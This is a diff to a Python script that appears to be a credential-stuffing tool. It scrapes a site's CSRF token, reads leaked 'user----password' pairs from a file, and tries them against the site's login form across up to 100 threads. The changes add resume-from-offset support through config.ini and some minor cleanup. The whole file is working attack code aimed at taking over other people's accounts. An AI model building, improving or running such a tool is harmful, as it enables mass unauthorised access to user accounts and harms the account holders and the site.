@@ -5,6 +5,7 @@ from lxml import etree
 import threading
 import random
 import sys
+import os
 
 
 def login(username, password):
@@ -25,7 +26,7 @@ def login(username, password):
 
     html = etree.HTML(html)
     token = html.xpath("//input[@name='login[_csrf_token]']/@value")[0]
-    print(token)
+    # print(token)
 
     data = {
         "login[mailAddress]": username,
@@ -49,19 +50,28 @@ def login(username, password):
 
 def main():
     file_name = sys.argv[1]
-
     t_list = []
+    file_on = os.path.exists("config.ini")
+    if file_on:
+        with open("config.ini", "r") as cf:
+            cd_text = cf.read().strip()
+            index = cd_text[cd_text.find("=")+1:]
+    else:
+        index = 0
     with open(file_name, "rb") as f:
+        # print(f.tell())
+        f.seek(int(index), 0)
         for text in f:
+            with open("config.ini", "w+") as cf:
+                cf.write("index=" + str(f.tell()))
             if len(t_list) >= 100:
                 for t in t_list:
                     t.join()
                     t_list.remove(t)
             else:
                 # print(text.strip().decode())
-                line_text = text.strip().decode()
-
                 try:
+                    line_text = text.strip().decode()
                     username = line_text[:line_text.index("----")]
                     password = line_text[line_text.rindex("----")+4:]
                 except Exception:
